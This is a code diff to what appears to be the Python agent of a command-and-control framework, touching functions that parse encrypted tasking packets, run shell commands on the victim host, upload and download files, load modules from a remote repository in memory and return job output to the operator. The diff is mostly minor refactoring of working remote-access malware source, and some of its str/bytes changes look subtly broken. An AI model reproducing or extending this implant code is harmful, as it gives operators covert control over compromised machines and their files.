@@ -12,7 +12,6 @@ import threading
 import http.server
 import zipfile
 import io
-import importlib.util
 import types
 import re
 import shutil
@@ -174,12 +173,6 @@ def parse_task_packet(packet, offset=0):
 
     Returns a tuple with (responseName, totalPackets, packetNum, resultID, length, data, remainingData)
     """
-
-    # print "parse_task_packet"
-
-    if (isinstance(packet, str)):
-        packet = packet.encode('UTF-8')
-
     try:
         packetType = struct.unpack('=H', packet[0 + offset:2 + offset])[0]
         totalPacket = struct.unpack('=H', packet[2 + offset:4 + offset])[0]
@@ -201,7 +194,7 @@ def process_tasking(data):
     #   -extracts the packets and processes each
     try:
         # aes_decrypt_and_verify is in stager.py
-        tasking = aes_decrypt_and_verify(key, data)
+        tasking = aes_decrypt_and_verify(key, data).encode('UTF-8')
 
         (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking)
 
@@ -240,8 +233,6 @@ def process_job_tasking(result):
     try:
         resultPackets = b""
         if result:
-            if isinstance(result, str):
-                result = result.encode('UTF-8')
             resultPackets += result
         # send packets
         send_message(resultPackets)
@@ -251,8 +242,6 @@ def process_job_tasking(result):
 
 
 def process_packet(packetType, data, resultID):
-    if (isinstance(data, bytes)):
-        data = data.decode('UTF-8')
     try:
         packetType = int(packetType)
     except Exception as e:
@@ -273,12 +262,12 @@ def process_packet(packetType, data, resultID):
         if len(parts) == 1:
             data = parts[0]
             resultData = str(run_command(data))
-            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
+            send_message(build_response_packet(40, resultData, resultID))
         else:
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
-            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
+            send_message(build_response_packet(40, resultData, resultID))
 
     elif packetType == 41:
         # file download
@@ -347,9 +336,8 @@ def process_packet(packetType, data, resultID):
                                                    "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." % (
                                                    dec_data['header_crc32'], dec_data['dec_crc32'],
                                                    dec_data['crc32_check']), resultID))
-            f = open(filePath, 'ab')
-            f.write(dec_data['data'])
-            f.close()
+            with open(filePath, 'ab') as f:
+                f.write(dec_data['data'])
 
             send_message(build_response_packet(42, "[*] Upload of %s successful" % (filePath), resultID))
         except Exception as e:
@@ -604,7 +592,6 @@ class CFinder(object):
         modulepath = '/'.join(parts)
 
         # check to see if that specific module exists
-
         for suffix, is_package in _search_order:
             relpath = modulepath + suffix
             try:
@@ -625,7 +612,6 @@ class CFinder(object):
         source = moduleRepo[repoName].read(relpath)
         source = source.replace('\r\n', '\n')
         source = source.replace('\r', '\n')
-
         return submodule, is_package, fullpath, source
 
     def find_module(self, fullname, path=None):
@@ -871,7 +857,6 @@ def job_func(resultID):
         # now call the function required
         # and capture the output via sys
         method()
-        #sys.stdout = old_stdout
         sys.stdout = sys.__stdout__
         dataStats_2 = buffer.getvalue()
         result = build_response_packet(110, str(dataStats_2), resultID)
